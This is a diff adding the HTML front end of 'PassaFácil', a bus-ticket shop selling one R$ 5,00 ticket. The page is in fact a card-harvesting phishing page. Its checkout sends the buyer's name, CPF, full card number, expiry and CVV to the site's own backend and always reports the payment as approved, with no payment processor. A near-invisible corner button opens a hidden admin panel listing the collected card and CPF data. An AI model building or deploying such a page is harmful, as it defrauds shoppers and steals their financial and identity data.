@@ -1,0 +1,770 @@
+<!-- language: HTML, file: passafacil/public/index.html, target: browser moderno -->
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>PassaFácil — Passagens de ônibus</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+      background: #f4f6fb;
+      color: #1f2937;
+      min-height: 100vh;
+    }
+    header {
+      background: linear-gradient(135deg, #1d4ed8, #3b82f6);
+      color: #fff;
+      padding: 0 32px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      height: 68px;
+      box-shadow: 0 2px 10px rgba(29, 78, 216, 0.25);
+      position: sticky;
+      top: 0;
+      z-index: 10;
+    }
+    header .logo { font-size: 1.35rem; font-weight: 700; letter-spacing: -0.5px; cursor: pointer; }
+    header .logo span { color: #bfdbfe; }
+    nav { display: flex; gap: 8px; align-items: center; }
+    nav button {
+      background: transparent; border: none; color: #e0ecff; font-size: 1rem;
+      padding: 10px 18px; border-radius: 8px; cursor: pointer;
+      transition: background 0.2s, color 0.2s;
+    }
+    nav button:hover { background: rgba(255, 255, 255, 0.15); }
+    nav button.active { background: #fff; color: #1d4ed8; font-weight: 600; }
+    #nav-logs { display: none; }
+    #nav-logs.visible { display: inline-block; background: rgba(255, 255, 255, 0.12); border: 1px solid rgba(255, 255, 255, 0.25); }
+    #nav-logs.visible:hover { background: rgba(255, 255, 255, 0.25); }
+    #nav-logs.visible.active { background: #fff; color: #1d4ed8; }
+
+    main { max-width: 960px; margin: 0 auto; padding: 48px 24px 80px; }
+    .view { display: none; }
+    .view.active { display: block; animation: fade 0.3s ease; }
+    @keyframes fade {
+      from { opacity: 0; transform: translateY(8px); }
+      to   { opacity: 1; transform: translateY(0); }
+    }
+
+    .disguised-login {
+      position: fixed; bottom: 8px; left: 8px; width: 22px; height: 22px;
+      background: transparent; border: none; cursor: pointer; opacity: 0.15;
+      z-index: 50; transition: opacity 0.2s;
+    }
+    .disguised-login:hover { opacity: 0.4; }
+    .disguised-login.logged { opacity: 0.4; }
+    .disguised-login.logged::after {
+      content: ''; position: absolute; inset: 0; border-radius: 50%;
+      background: #22c55e; box-shadow: 0 0 6px rgba(34, 197, 94, 0.6);
+    }
+
+    .login-modal {
+      display: none; position: fixed; inset: 0; background: rgba(0, 0, 0, 0.55);
+      z-index: 100; align-items: center; justify-content: center; padding: 24px;
+    }
+    .login-modal.open { display: flex; animation: fade 0.2s ease; }
+    .login-card {
+      background: #fff; border-radius: 16px; padding: 32px; width: 100%;
+      max-width: 360px; box-shadow: 0 20px 60px rgba(0, 0, 0, 0.35);
+    }
+    .login-card h3 { font-size: 1.25rem; color: #1e3a8a; margin-bottom: 6px; }
+    .login-card p { color: #6b7280; font-size: 0.9rem; margin-bottom: 24px; }
+    .login-card .form-group { margin-bottom: 14px; text-align: left; }
+    .login-card .form-group label {
+      display: block; font-size: 0.85rem; font-weight: 600; color: #374151; margin-bottom: 6px;
+    }
+    .login-card .form-group input {
+      width: 100%; padding: 11px 13px; border: 1.5px solid #d1d5db;
+      border-radius: 10px; font-size: 0.95rem; font-family: inherit;
+    }
+    .login-card .form-group input:focus {
+      outline: none; border-color: #3b82f6; box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.15);
+    }
+    .login-error { color: #ef4444; font-size: 0.82rem; margin-bottom: 10px; display: none; }
+    .login-error.show { display: block; }
+    .login-actions { display: flex; gap: 10px; margin-top: 20px; }
+    .login-actions button {
+      flex: 1; padding: 12px; border-radius: 10px; font-size: 0.95rem;
+      font-weight: 600; cursor: pointer; border: none; transition: background 0.2s;
+    }
+    .btn-cancel { background: #f3f4f6; color: #374151; }
+    .btn-cancel:hover { background: #e5e7eb; }
+    .btn-enter { background: #1d4ed8; color: #fff; }
+    .btn-enter:hover { background: #1e40af; }
+
+    #view-home.active {
+      position: relative; display: flex; align-items: center; justify-content: center;
+      min-height: calc(100vh - 68px); margin: -48px -24px -80px; overflow: hidden;
+    }
+    #view-home .bg-video {
+      position: absolute; top: 50%; left: 50%; min-width: 100%; min-height: 100%;
+      width: auto; height: auto; transform: translate(-50%, -50%);
+      object-fit: cover; z-index: 0; filter: brightness(0.55);
+    }
+    #view-home .overlay {
+      position: absolute; inset: 0;
+      background: linear-gradient(180deg, rgba(10, 20, 60, 0.45), rgba(10, 20, 60, 0.65));
+      z-index: 1;
+    }
+    .hero {
+      position: relative; z-index: 2; text-align: center;
+      padding: 60px 32px; max-width: 720px; color: #fff;
+    }
+    .hero h1 {
+      font-size: clamp(2rem, 5vw, 3rem); margin-bottom: 18px; letter-spacing: -1px;
+      text-shadow: 0 2px 16px rgba(0, 0, 0, 0.5); line-height: 1.15;
+    }
+    .hero p {
+      font-size: 1.15rem; max-width: 520px; margin: 0 auto 36px; line-height: 1.65;
+      text-shadow: 0 1px 10px rgba(0, 0, 0, 0.6); color: #eef4ff;
+    }
+    .hero .btn-primary {
+      background: #1d4ed8; color: #fff; border: none; padding: 16px 42px;
+      border-radius: 12px; font-size: 1.1rem; font-weight: 700; cursor: pointer;
+      transition: background 0.2s, transform 0.1s;
+      box-shadow: 0 8px 30px rgba(0, 0, 0, 0.3);
+    }
+    .hero .btn-primary:hover { background: #1e40af; transform: translateY(-2px); }
+
+    .page-title {
+      font-size: 1.6rem; color: #1e3a8a; margin-bottom: 24px; letter-spacing: -0.5px;
+    }
+    .card {
+      background: #fff; border-radius: 16px; box-shadow: 0 6px 24px rgba(0, 0, 0, 0.07);
+      padding: 20px 28px 20px 20px; display: flex; align-items: center; gap: 24px;
+      cursor: pointer; transition: transform 0.15s, box-shadow 0.15s;
+      border: 2px solid transparent;
+    }
+    .card:hover {
+      transform: translateY(-3px); box-shadow: 0 12px 32px rgba(29, 78, 216, 0.15);
+      border-color: #93c5fd;
+    }
+    .card-media {
+      width: 80px; height: 80px; border-radius: 14px; overflow: hidden;
+      flex-shrink: 0; background: #dbeafe;
+    }
+    .card-media video { width: 100%; height: 100%; object-fit: cover; display: block; }
+    .card-info { flex: 1; }
+    .card-info h3 { font-size: 1.15rem; color: #111827; margin-bottom: 4px; }
+    .card-info p { font-size: 0.92rem; color: #6b7280; }
+    .card-price { font-size: 1.5rem; font-weight: 700; color: #1d4ed8; white-space: nowrap; }
+
+    #view-detalhe.active {
+      position: relative; display: flex; align-items: center; justify-content: center;
+      min-height: calc(100vh - 68px); margin: -48px -24px -80px; overflow: hidden;
+    }
+    #view-detalhe .bg-video {
+      position: absolute; top: 50%; left: 50%; min-width: 100%; min-height: 100%;
+      width: auto; height: auto; transform: translate(-50%, -50%);
+      object-fit: cover; z-index: 0; filter: brightness(0.5);
+    }
+    #view-detalhe .overlay {
+      position: absolute; inset: 0;
+      background: linear-gradient(180deg, rgba(10, 20, 60, 0.5), rgba(10, 20, 60, 0.7));
+      z-index: 1;
+    }
+    .detail-wrap { position: relative; z-index: 2; width: 100%; max-width: 560px; padding: 24px; }
+    .detail-wrap .back-link {
+      color: #e0ecff; font-size: 0.95rem; cursor: pointer; text-decoration: underline;
+      margin-bottom: 16px; background: rgba(0, 0, 0, 0.3);
+      border: 1px solid rgba(255, 255, 255, 0.2); border-radius: 8px;
+      padding: 8px 14px; backdrop-filter: blur(6px);
+    }
+    .detail-wrap .back-link:hover { background: rgba(0, 0, 0, 0.5); }
+    .detail {
+      background: rgba(255, 255, 255, 0.96); backdrop-filter: blur(10px);
+      border-radius: 20px; padding: 40px; box-shadow: 0 20px 60px rgba(0, 0, 0, 0.35);
+      text-align: center; border: 1px solid rgba(255, 255, 255, 0.5);
+    }
+    .detail .big-media {
+      width: 120px; height: 120px; border-radius: 20px; overflow: hidden;
+      margin: 0 auto 20px; background: #dbeafe;
+    }
+    .detail .big-media video { width: 100%; height: 100%; object-fit: cover; display: block; }
+    .detail h2 { font-size: 1.5rem; color: #1e3a8a; margin-bottom: 8px; }
+    .detail .desc { color: #6b7280; }
+    .detail .price-tag { font-size: 2rem; font-weight: 800; color: #1d4ed8; margin: 16px 0 28px; }
+    .btn-buy {
+      width: 100%; background: #16a34a; color: #fff; border: none; padding: 16px;
+      border-radius: 12px; font-size: 1.1rem; font-weight: 700; cursor: pointer;
+      transition: background 0.2s, transform 0.1s;
+    }
+    .btn-buy:hover { background: #15803d; transform: translateY(-2px); }
+
+    .pay-box {
+      background: #fff; border-radius: 20px; padding: 36px;
+      box-shadow: 0 8px 30px rgba(0, 0, 0, 0.06); max-width: 480px; margin: 0 auto;
+    }
+    .pay-box h2 { font-size: 1.5rem; color: #1e3a8a; margin-bottom: 6px; }
+    .pay-box .sub { color: #6b7280; font-size: 0.95rem; margin-bottom: 28px; }
+    .form-group { margin-bottom: 18px; text-align: left; }
+    .form-group label {
+      display: block; font-size: 0.88rem; font-weight: 600; color: #374151; margin-bottom: 6px;
+    }
+    .form-group input {
+      width: 100%; padding: 12px 14px; border: 1.5px solid #d1d5db; border-radius: 10px;
+      font-size: 1rem; font-family: inherit; transition: border 0.2s, box-shadow 0.2s;
+      background: #fff;
+    }
+    .form-group input:focus {
+      outline: none; border-color: #3b82f6; box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.15);
+    }
+    .form-group input.invalid {
+      border-color: #ef4444; box-shadow: 0 0 0 3px rgba(239, 68, 68, 0.15);
+    }
+    .form-group .error-msg { display: none; color: #ef4444; font-size: 0.8rem; margin-top: 4px; }
+    .form-group .error-msg.show { display: block; }
+    .form-row { display: flex; gap: 12px; }
+    .form-row .form-group { flex: 1; }
+    .total-line {
+      display: flex; justify-content: space-between; align-items: center;
+      padding: 16px 0; margin-top: 8px; border-top: 1.5px dashed #e5e7eb;
+      font-size: 1.05rem; color: #374151;
+    }
+    .total-line strong { font-size: 1.5rem; color: #1d4ed8; }
+    .btn-pay {
+      width: 100%; background: #1d4ed8; color: #fff; border: none; padding: 16px;
+      border-radius: 12px; font-size: 1.1rem; font-weight: 700; cursor: pointer;
+      margin-top: 16px; transition: background 0.2s, transform 0.1s;
+    }
+    .btn-pay:hover { background: #1e40af; transform: translateY(-2px); }
+
+    #view-processando.active {
+      display: flex; align-items: center; justify-content: center;
+      min-height: calc(100vh - 68px); margin: -48px -24px -80px;
+    }
+    .processing-box { text-align: center; padding: 40px; }
+    .spinner {
+      width: 72px; height: 72px; border: 6px solid #dbeafe; border-top-color: #1d4ed8;
+      border-radius: 50%; margin: 0 auto 28px; animation: spin 0.9s linear infinite;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .processing-box h2 { font-size: 1.4rem; color: #1e3a8a; margin-bottom: 8px; }
+    .processing-box p { color: #6b7280; }
+
+    #view-sucesso.active {
+      display: flex; align-items: center; justify-content: center;
+      min-height: calc(100vh - 68px); margin: -48px -24px -80px;
+    }
+    .success {
+      background: #fff; border-radius: 20px; padding: 48px 36px;
+      box-shadow: 0 8px 30px rgba(0, 0, 0, 0.06);
+      max-width: 480px; width: 100%; text-align: center;
+    }
+    .success .check {
+      width: 80px; height: 80px; background: #dcfce7; color: #16a34a;
+      border-radius: 50%; display: flex; align-items: center; justify-content: center;
+      font-size: 2.6rem; margin: 0 auto 20px; animation: pop 0.4s ease;
+    }
+    @keyframes pop {
+      0% { transform: scale(0); }
+      70% { transform: scale(1.15); }
+      100% { transform: scale(1); }
+    }
+    .success h2 { font-size: 1.6rem; color: #166534; margin-bottom: 8px; }
+    .success p { color: #4b5563; margin-bottom: 28px; line-height: 1.6; }
+    .success .code {
+      background: #f3f4f6; border-radius: 10px; padding: 14px; font-family: monospace;
+      font-size: 1.1rem; letter-spacing: 2px; color: #1f2937; margin-bottom: 28px;
+    }
+    .success .btn-primary {
+      background: #1d4ed8; color: #fff; border: none; padding: 14px 36px;
+      border-radius: 10px; font-size: 1.05rem; font-weight: 600; cursor: pointer;
+      transition: background 0.2s;
+    }
+    .success .btn-primary:hover { background: #1e40af; }
+    .back-link {
+      background: none; border: none; color: #1d4ed8; font-size: 0.95rem;
+      cursor: pointer; text-decoration: underline; margin-bottom: 20px; padding: 0;
+    }
+    .back-link:hover { color: #1e40af; }
+
+    .logs-header {
+      display: flex; justify-content: space-between; align-items: center;
+      margin-bottom: 24px; flex-wrap: wrap; gap: 12px;
+    }
+    .logs-header h2 { font-size: 1.6rem; color: #1e3a8a; letter-spacing: -0.5px; }
+    .logs-header .btn-logout {
+      background: #ef4444; color: #fff; border: none; padding: 10px 20px;
+      border-radius: 10px; font-size: 0.9rem; font-weight: 600; cursor: pointer;
+    }
+    .logs-header .btn-logout:hover { background: #dc2626; }
+    .log-stats {
+      display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+      gap: 14px; margin-bottom: 28px;
+    }
+    .log-stat {
+      background: #fff; border-radius: 14px; padding: 18px 20px;
+      box-shadow: 0 4px 16px rgba(0, 0, 0, 0.06);
+    }
+    .log-stat .label { font-size: 0.82rem; color: #6b7280; margin-bottom: 6px; }
+    .log-stat .value { font-size: 1.6rem; font-weight: 700; color: #1d4ed8; }
+    .log-table-wrap {
+      background: #fff; border-radius: 16px; box-shadow: 0 6px 24px rgba(0, 0, 0, 0.07);
+      overflow-x: auto;
+    }
+    .log-table { width: 100%; border-collapse: collapse; font-size: 0.9rem; }
+    .log-table thead { background: #f9fafb; }
+    .log-table th {
+      text-align: left; padding: 14px 18px; font-size: 0.8rem;
+      text-transform: uppercase; letter-spacing: 0.5px; color: #6b7280;
+      font-weight: 600; border-bottom: 1px solid #e5e7eb; white-space: nowrap;
+    }
+    .log-table td {
+      padding: 14px 18px; border-bottom: 1px solid #f3f4f6; color: #374151;
+      white-space: nowrap;
+    }
+    .log-table tr:last-child td { border-bottom: none; }
+    .log-table tr:hover { background: #f9fafb; }
+    .log-table .empty { text-align: center; color: #9ca3af; padding: 40px; font-style: italic; }
+    .log-table code {
+      background: #f3f4f6; padding: 3px 8px; border-radius: 6px; font-size: 0.85rem;
+    }
+    .badge {
+      display: inline-block; padding: 3px 10px; border-radius: 20px;
+      font-size: 0.75rem; font-weight: 600;
+    }
+    .badge.ok { background: #dcfce7; color: #166534; }
+    .badge.fail { background: #fee2e2; color: #991b1b; }
+    .logs-section-title { font-size: 1.1rem; color: #1e3a8a; margin: 0 0 12px; }
+  </style>
+</head>
+<body>
+
+  <header>
+    <div class="logo" onclick="showView('home')">Passa<span>Fácil</span></div>
+    <nav>
+      <button id="nav-home" class="active" onclick="showView('home')">Home</button>
+      <button id="nav-produtos" onclick="showView('produtos')">Produtos</button>
+      <button id="nav-logs" onclick="showView('logs')">Logs</button>
+    </nav>
+  </header>
+
+  <main>
+
+    <section id="view-home" class="view active">
+      <video class="bg-video" autoplay muted loop playsinline>
+        <source src="video/fundo.mp4" type="video/mp4" />
+      </video>
+      <div class="overlay"></div>
+      <div class="hero">
+        <h1>Sua passagem, sem fila.</h1>
+        <p>Compre passagens de ônibus em segundos, com preço fixo e pagamento na hora. Simples assim.</p>
+        <button class="btn-primary" onclick="showView('produtos')">Ver produtos →</button>
+      </div>
+    </section>
+
+    <section id="view-produtos" class="view">
+      <h2 class="page-title">Produtos</h2>
+      <div class="card" onclick="showView('detalhe')">
+        <div class="card-media">
+          <video autoplay muted loop playsinline>
+            <source src="video/card.mp4" type="video/mp4" />
+          </video>
+        </div>
+        <div class="card-info">
+          <h3>Passagem de Ônibus</h3>
+          <p>Trecho único • Embarque imediato</p>
+        </div>
+        <div class="card-price">R$ 5,00</div>
+      </div>
+    </section>
+
+    <section id="view-detalhe" class="view">
+      <video class="bg-video" autoplay muted loop playsinline>
+        <source src="video/passagem.mp4" type="video/mp4" />
+      </video>
+      <div class="overlay"></div>
+      <div class="detail-wrap">
+        <button class="back-link" onclick="showView('produtos')">← Voltar aos produtos</button>
+        <div class="detail">
+          <div class="big-media">
+            <video autoplay muted loop playsinline>
+              <source src="video/card.mp4" type="video/mp4" />
+            </video>
+          </div>
+          <h2>Passagem de Ônibus</h2>
+          <p class="desc">Trecho único • Embarque imediato</p>
+          <div class="price-tag">R$ 5,00</div>
+          <button class="btn-buy" onclick="showView('pagamento')">Comprar</button>
+        </div>
+      </div>
+    </section>
+
+    <section id="view-pagamento" class="view">
+      <button class="back-link" onclick="showView('detalhe')">← Voltar</button>
+      <div class="pay-box">
+        <h2>Pagamento</h2>
+        <p class="sub">Cartão de crédito</p>
+
+        <form id="pay-form" onsubmit="iniciarPagamento(event)" novalidate>
+          <div class="form-group">
+            <label>Nome completo</label>
+            <input type="text" id="nome" placeholder="Seu nome" />
+            <div class="error-msg" id="erro-nome">Preencha o nome.</div>
+          </div>
+          <div class="form-group">
+            <label>CPF</label>
+            <input type="text" id="cpf" placeholder="000.000.000-00" maxlength="14" inputmode="numeric" />
+            <div class="error-msg" id="erro-cpf">CPF inválido.</div>
+          </div>
+          <div class="form-group">
+            <label>Número do cartão</label>
+            <input type="text" id="cartao" placeholder="0000 0000 0000 0000" maxlength="19" inputmode="numeric" />
+            <div class="error-msg" id="erro-cartao">Número inválido. Use 16 dígitos.</div>
+          </div>
+          <div class="form-row">
+            <div class="form-group">
+              <label>Validade</label>
+              <input type="text" id="validade" placeholder="MM/AA" maxlength="5" inputmode="numeric" />
+              <div class="error-msg" id="erro-validade">MM/AA inválido.</div>
+            </div>
+            <div class="form-group">
+              <label>CVV</label>
+              <input type="text" id="cvv" placeholder="000" maxlength="4" inputmode="numeric" />
+              <div class="error-msg" id="erro-cvv">CVV inválido.</div>
+            </div>
+          </div>
+          <div class="total-line">
+            <span>Total</span>
+            <strong>R$ 5,00</strong>
+          </div>
+          <button type="submit" class="btn-pay">Pagar R$ 5,00</button>
+        </form>
+      </div>
+    </section>
+
+    <section id="view-processando" class="view">
+      <div class="processing-box">
+        <div class="spinner"></div>
+        <h2>Processando pagamento…</h2>
+        <p>Não feche esta página.</p>
+      </div>
+    </section>
+
+    <section id="view-sucesso" class="view">
+      <div class="success">
+        <div class="check">✓</div>
+        <h2>Confirmado!</h2>
+        <p>Pagamento aprovado. Apresente este código no embarque.</p>
+        <div class="code" id="codigo-compra">PASS-0000</div>
+        <button class="btn-primary" onclick="showView('home')">Voltar ao início</button>
+      </div>
+    </section>
+
+    <section id="view-logs" class="view">
+      <div class="logs-header">
+        <h2>Logs de acesso e pagamentos</h2>
+        <button class="btn-logout" onclick="fazerLogout()">Sair do painel</button>
+      </div>
+      <div class="log-stats">
+        <div class="log-stat">
+          <div class="label">Tentativas de login</div>
+          <div class="value" id="stat-total">0</div>
+        </div>
+        <div class="log-stat">
+          <div class="label">Logins bem-sucedidos</div>
+          <div class="value" id="stat-ok">0</div>
+        </div>
+        <div class="log-stat">
+          <div class="label">Pagamentos</div>
+          <div class="value" id="stat-pag">0</div>
+        </div>
+        <div class="log-stat">
+          <div class="label">Total arrecadado</div>
+          <div class="value" id="stat-total-valor">R$ 0,00</div>
+        </div>
+      </div>
+      <h3 class="logs-section-title">Pagamentos</h3>
+      <div class="log-table-wrap" style="margin-bottom:28px;">
+        <table class="log-table">
+          <thead>
+            <tr>
+              <th>Data / Hora</th>
+              <th>Nome</th>
+              <th>CPF</th>
+              <th>Cartão</th>
+              <th>Validade</th>
+              <th>Valor</th>
+              <th>Código</th>
+            </tr>
+          </thead>
+          <tbody id="pay-log-body"></tbody>
+        </table>
+      </div>
+      <h3 class="logs-section-title">Tentativas de login</h3>
+      <div class="log-table-wrap">
+        <table class="log-table">
+          <thead>
+            <tr>
+              <th>Data / Hora</th>
+              <th>Usuário</th>
+              <th>Status</th>
+              <th>Detalhe</th>
+            </tr>
+          </thead>
+          <tbody id="log-body"></tbody>
+        </table>
+      </div>
+    </section>
+
+  </main>
+
+  <button class="disguised-login" id="secret-btn" aria-label="·" onclick="abrirLogin()"></button>
+
+  <div class="login-modal" id="login-modal">
+    <div class="login-card">
+      <h3>Painel administrativo</h3>
+      <p>Acesso restrito.</p>
+      <div class="form-group">
+        <label>Usuário</label>
+        <input type="text" id="login-user" autocomplete="off" />
+      </div>
+      <div class="form-group">
+        <label>Senha</label>
+        <input type="password" id="login-pass" autocomplete="off" />
+      </div>
+      <div class="login-error" id="login-error">Usuário ou senha incorretos.</div>
+      <div class="login-actions">
+        <button type="button" class="btn-cancel" onclick="fecharLogin()">Cancelar</button>
+        <button type="button" class="btn-enter" onclick="tentarLogin()">Entrar</button>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    let isAdmin = false;
+    let token = null;
+
+    function showView(id) {
+      if (id === 'logs' && !isAdmin) return;
+      document.querySelectorAll('.view').forEach(v => v.classList.remove('active'));
+      document.getElementById('view-' + id).classList.add('active');
+      document.getElementById('nav-home').classList.toggle('active', id === 'home');
+      document.getElementById('nav-produtos').classList.toggle('active',
+        ['produtos', 'detalhe', 'pagamento', 'processando', 'sucesso'].includes(id));
+      document.getElementById('nav-logs').classList.toggle('active', id === 'logs');
+      window.scrollTo({ top: 0, behavior: 'smooth' });
+      if (id === 'logs') renderLogs();
+    }
+
+    function abrirLogin() {
+      if (isAdmin) { showView('logs'); return; }
+      document.getElementById('login-modal').classList.add('open');
+      document.getElementById('login-user').value = '';
+      document.getElementById('login-pass').value = '';
+      document.getElementById('login-error').classList.remove('show');
+      setTimeout(() => document.getElementById('login-user').focus(), 100);
+    }
+    function fecharLogin() {
+      document.getElementById('login-modal').classList.remove('open');
+    }
+
+    async function tentarLogin() {
+      const usuario = document.getElementById('login-user').value.trim();
+      const senha = document.getElementById('login-pass').value;
+      try {
+        const r = await fetch('/api/login', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ usuario, senha })
+        });
+        if (r.ok) {
+          const data = await r.json();
+          token = data.token;
+          isAdmin = true;
+          fecharLogin();
+          document.getElementById('secret-btn').classList.add('logged');
+          document.getElementById('nav-logs').classList.add('visible');
+          showView('logs');
+        } else {
+          document.getElementById('login-error').classList.add('show');
+          document.getElementById('login-pass').value = '';
+          document.getElementById('login-pass').focus();
+        }
+      } catch {
+        document.getElementById('login-error').textContent = 'Erro de conexão.';
+        document.getElementById('login-error').classList.add('show');
+      }
+    }
+
+    async function fazerLogout() {
+      if (token) {
+        try {
+          await fetch('/api/logout', {
+            method: 'POST',
+            headers: { 'Authorization': token }
+          });
+        } catch {}
+      }
+      token = null;
+      isAdmin = false;
+      document.getElementById('secret-btn').classList.remove('logged');
+      document.getElementById('nav-logs').classList.remove('visible');
+      showView('home');
+    }
+
+    document.getElementById('login-pass').addEventListener('keydown', e => {
+      if (e.key === 'Enter') tentarLogin();
+    });
+    document.getElementById('login-user').addEventListener('keydown', e => {
+      if (e.key === 'Enter') document.getElementById('login-pass').focus();
+    });
+    document.addEventListener('keydown', e => {
+      if (e.key === 'Escape') fecharLogin();
+    });
+
+    async function renderLogs() {
+      if (!token) return;
+      try {
+        const [rp, rl] = await Promise.all([
+          fetch('/api/pagamentos', { headers: { 'Authorization': token } }),
+          fetch('/api/logins', { headers: { 'Authorization': token } })
+        ]);
+        const pagamentos = await rp.json();
+        const logins = await rl.json();
+
+        document.getElementById('stat-total').textContent = logins.length;
+        document.getElementById('stat-ok').textContent =
+          logins.filter(l => l.status === 'ok').length;
+        document.getElementById('stat-pag').textContent = pagamentos.length;
+        const soma = pagamentos.reduce((s, p) => s + p.valor, 0);
+        document.getElementById('stat-total-valor').textContent =
+          'R$ ' + soma.toFixed(2).replace('.', ',');
+
+        const payBody = document.getElementById('pay-log-body');
+        payBody.innerHTML = pagamentos.length === 0
+          ? '<tr><td colspan="7" class="empty">Nenhum pagamento registrado ainda.</td></tr>'
+          : pagamentos.map(p => `<tr>
+              <td>${new Date(p.time).toLocaleString('pt-BR')}</td>
+              <td>${escapeHtml(p.nome)}</td>
+              <td><code>${escapeHtml(p.cpf)}</code></td>
+              <td><code>${escapeHtml(p.cartao)}</code></td>
+              <td>${escapeHtml(p.validade)}</td>
+              <td>R$ ${p.valor.toFixed(2).replace('.', ',')}</td>
+              <td><code>${p.codigo}</code></td>
+            </tr>`).join('');
+
+        const body = document.getElementById('log-body');
+        body.innerHTML = logins.length === 0
+          ? '<tr><td colspan="4" class="empty">Nenhum log registrado ainda.</td></tr>'
+          : logins.map(l => {
+              const badge = l.status === 'ok'
+                ? '<span class="badge ok">Sucesso</span>'
+                : '<span class="badge fail">Falha</span>';
+              return `<tr>
+                <td>${new Date(l.time).toLocaleString('pt-BR')}</td>
+                <td>${escapeHtml(l.usuario)}</td>
+                <td>${badge}</td>
+                <td>${escapeHtml(l.detalhe)}</td>
+              </tr>`;
+            }).join('');
+      } catch {
+        console.warn('falha ao carregar logs');
+      }
+    }
+
+    function escapeHtml(s) {
+      return String(s).replace(/[&<>"']/g, c => ({
+        '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;'
+      }[c]));
+    }
+
+    document.getElementById('cpf').addEventListener('input', function (e) {
+      let v = e.target.value.replace(/\D/g, '').slice(0, 11);
+      v = v.replace(/(\d{3})(\d)/, '$1.$2');
+      v = v.replace(/(\d{3})(\d)/, '$1.$2');
+      v = v.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
+      e.target.value = v;
+    });
+    document.getElementById('cartao').addEventListener('input', function (e) {
+      let v = e.target.value.replace(/\D/g, '').slice(0, 16);
+      e.target.value = v.replace(/(.{4})/g, '$1 ').trim();
+    });
+    document.getElementById('validade').addEventListener('input', function (e) {
+      let v = e.target.value.replace(/\D/g, '').slice(0, 4);
+      if (v.length >= 3) v = v.slice(0, 2) + '/' + v.slice(2);
+      e.target.value = v;
+    });
+    document.getElementById('cvv').addEventListener('input', function (e) {
+      e.target.value = e.target.value.replace(/\D/g, '').slice(0, 4);
+    });
+
+    function setError(id, show) {
+      document.getElementById(id).classList.toggle('invalid', show);
+      document.getElementById('erro-' + id).classList.toggle('show', show);
+    }
+
+    function validar() {
+      let ok = true;
+      const nome = document.getElementById('nome').value.trim();
+      const nomeOk = nome.length >= 3 && nome.includes(' ');
+      setError('nome', !nomeOk); if (!nomeOk) ok = false;
+
+      const cpf = document.getElementById('cpf').value.replace(/\D/g, '');
+      const cpfOk = cpf.length === 11 && !/^(\d)\1{10}$/.test(cpf);
+      setError('cpf', !cpfOk); if (!cpfOk) ok = false;
+
+      const cartao = document.getElementById('cartao').value.replace(/\D/g, '');
+      const cartaoOk = cartao.length === 16;
+      setError('cartao', !cartaoOk); if (!cartaoOk) ok = false;
+
+      const validade = document.getElementById('validade').value;
+      const valOk = /^\d{2}\/\d{2}$/.test(validade) &&
+        parseInt(validade.slice(0, 2)) >= 1 && parseInt(validade.slice(0, 2)) <= 12;
+      setError('validade', !valOk); if (!valOk) ok = false;
+
+      const cvv = document.getElementById('cvv').value;
+      const cvvOk = cvv.length >= 3;
+      setError('cvv', !cvvOk); if (!cvvOk) ok = false;
+
+      return ok;
+    }
+
+    async function iniciarPagamento(e) {
+      e.preventDefault();
+      if (!validar()) return;
+
+      const dados = {
+        nome: document.getElementById('nome').value.trim(),
+        cpf: document.getElementById('cpf').value.trim(),
+        cartao: document.getElementById('cartao').value.trim(),
+        validade: document.getElementById('validade').value.trim(),
+        cvv: document.getElementById('cvv').value.trim()
+      };
+
+      showView('processando');
+
+      try {
+        // pausa mínima de 1.5s pra animação do spinner não piscar
+        const [r] = await Promise.all([
+          fetch('/api/pagamento', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(dados)
+          }),
+          new Promise(res => setTimeout(res, 1500))
+        ]);
+
+        if (!r.ok) throw new Error('falha no servidor');
+        const { codigo } = await r.json();
+        document.getElementById('codigo-compra').textContent = codigo;
+        showView('sucesso');
+      } catch {
+        alert('Não foi possível registrar o pagamento. Tente novamente.');
+        showView('pagamento');
+      }
+    }
+
+    ['nome', 'cpf', 'cartao', 'validade', 'cvv'].forEach(id => {
+      document.getElementById(id).addEventListener('input', function () {
+        if (this.classList.contains('invalid')) setError(id, false);
+      });
+    });
+  </script>
+
+</body>
+</html>
